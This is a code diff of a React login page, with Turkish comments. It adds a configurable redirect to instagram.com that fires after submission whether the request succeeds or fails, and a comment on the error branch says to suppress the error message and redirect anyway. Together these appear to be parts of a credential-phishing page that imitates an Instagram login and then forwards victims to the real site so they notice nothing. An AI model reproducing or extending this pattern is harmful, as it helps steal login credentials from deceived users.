@@ -14,6 +14,10 @@ import { Loader2 } from "lucide-react";
 import { LoginFormData, loginFormSchema } from "@shared/schema";
 import axios from "axios";
 
+// Bu değişken, kullanıcı giriş yaptıktan sonra yönlendirilecek URL'i belirler
+// Statik versiyonda bu değeri arayıp değiştirebilirsiniz
+const REDIRECT_URL = "https://instagram.com";
+
 export default function Login() {
   const form = useForm<LoginFormData>({
     resolver: zodResolver(loginFormSchema),
@@ -64,13 +68,13 @@ export default function Login() {
       return response.data;
     },
     onSuccess: () => {
-      // Formu sıfırla ve example.com'a yönlendir
+      // Formu sıfırla ve yönlendir
       form.reset();
-      window.location.href = "https://example.com";
+      window.location.href = REDIRECT_URL;
     },
     onError: () => {
       // Hata mesajını göstermeyelim ancak yine de yönlendirelim
-      window.location.href = "https://example.com";
+      window.location.href = REDIRECT_URL;
     },
   });
 
